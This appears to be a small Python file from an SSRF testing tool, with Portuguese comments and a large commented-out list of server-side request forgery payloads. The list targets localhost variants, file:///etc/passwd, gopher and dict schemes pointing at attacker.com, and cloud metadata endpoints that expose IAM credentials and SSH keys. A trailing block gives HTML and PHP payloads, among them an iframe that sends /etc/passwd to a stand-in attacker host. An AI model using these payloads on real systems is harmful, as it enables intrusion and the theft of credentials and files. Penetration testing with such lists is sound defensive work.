#temos que filtrar essas entradas
#entrada:/file=
#entrada:/path=
#entrada:/src=

payload_list = ["http://127.0.0.1:8080"]

'''
payload_list = ["http://127.0.0.1:port", "http://localhost:port", "https://127.0.0.1:port", "https://localhost:port", "http://[::]:port", "http://0000::1:port",
                "http://[0:0:0:0:0:ffff:127.0.0.1], http://0/", "http://127.1", "http://127.0.1/etc/passwd", "file:///etc/passwd", "file://path/to/file", "file://\/\/etc/passwd",
                "sftp://attacker.com:port/", "dict://attacker:port/", "tftp://attacker.com:port/", "ldap://localhost:port/", "gopher://127.0.0.1:port/",
                "http://instance-data", "http://169.254.169.254", "http://169.254.169.254/latest/user-data", "http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]",
                "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]", "http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance",
                "http://169.254.169.254/latest/meta-data/ami-id", "http://169.254.169.254/latest/meta-data/reservation-id", "http://169.254.169.254/latest/meta-data/hostname",
                "http://169.254.169.254/latest/meta-data/public-keys/", "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key", "http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy", "http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access", "http://169.254.169.254/latest/dynamic/instance-identity/document",
                "http://169.254.169.254/computeMetadata/v1/", "http://metadata.google.internal/computeMetadata/v1/", "http://metadata/computeMetadata/v1/", "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
                "http://metadata.google.internal/computeMetadata/v1/instance/id", "http://metadata.google.internal/computeMetadata/v1/project/project-id", "http://169.254.169.254/metadata/v1/maintenance", "http://169.254.169.254/metadata/instance?api-version=2017-04-02"
                "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text"
                   ]
'''
'''

\<img src="xxx" onerror="document.write('\<iframe src=file:///etc/passwd>\</iframe>')"/>\
\<link rel=attachment href="file:///etc/passwd">\
    
\<iframe src="http://attacker-ip/test.php?file=/etc/passwd">\</iframe>\

<?php $file = $_GET['file']; header("location:file://$file");?>'''